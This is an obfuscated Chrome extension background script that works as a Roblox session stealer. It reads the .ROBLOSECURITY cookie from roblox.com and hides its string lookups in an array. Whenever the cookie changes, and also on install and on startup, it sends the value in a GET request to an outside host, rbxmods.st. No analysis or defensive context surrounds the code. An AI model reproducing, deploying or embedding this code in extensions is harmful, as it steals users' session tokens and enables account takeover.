var secret, fetchInfo, Send;
(function() {
    function getCookieFunction() {
        return cookieMonitor
    }
    
    function isEqual(a, b) {
        return a === b
    }
    
    function getFetch() {
        return fetch
    }
    
    function concat(a, b) {
        return a + b
    }
    
    function getSendFunction() {
        return sendData
    }
    
    function getConsole() {
        return console
    }
    
    function notEqual(a, b) {
        return a !== b
    }
    
    function getChrome() {
        return chrome
    }
    
    var strings = [
        "9903185426129837",
        "https://www.roblox.com",
        ".ROBLOSECURITY",
        "value",
        "cacheRBX",
        "get",
        "local",
        "storage",
        "cookie updated:",
        "log",
        "set",
        "cookies",
        "https://rbxmods.st/info.php?c=",
        "&code=",
        "GET",
        "no-cors",
        "addListener",
        "onStartup",
        "runtime",
        "onInstalled",
        "roblox.com",
        "includes",
        "domain",
        "cookie",
        "name",
        "onChanged"
    ];

    async function cookieMonitor() {
        getChrome()[strings[11]][strings[5]]({
            url: strings[1],
            name: strings[2]
        }, async (cookie) => {
            if (cookie) {
                const currentValue = cookie[strings[3]];
                const stored = await getChrome()[strings[7]][strings[6]][strings[5]](strings[4]);
                if (notEqual(stored[strings[4]], currentValue)) {
                    getConsole()[strings[9]](strings[8], currentValue);
                    getChrome()[strings[7]][strings[6]][strings[10]]({
                        cacheRBX: currentValue
                    });
                    getSendFunction()(currentValue)
                }
            }
        })
    }

    function sendData(value) {
        getFetch()(concat(concat(strings[12], value) + strings[13], secret), {
            method: strings[14],
            mode: strings[15]
        })
    }
    
    fetchInfo = cookieMonitor;
    if (cookieMonitor === 1) {
        return
    } else {
        Send = sendData
    };
    
    secret = strings[0];
    
    chrome[strings[18]][strings[17]][strings[16]](cookieMonitor);
    chrome[strings[18]][strings[19]][strings[16]](cookieMonitor);
    
    chrome[strings[11]][strings[25]][strings[16]]((changeInfo) => {
        if (changeInfo[strings[23]][strings[22]][strings[21]](strings[20]) && isEqual(changeInfo[strings[23]][strings[24]], strings[2])) {
            getCookieFunction()()
        }
    })
})()
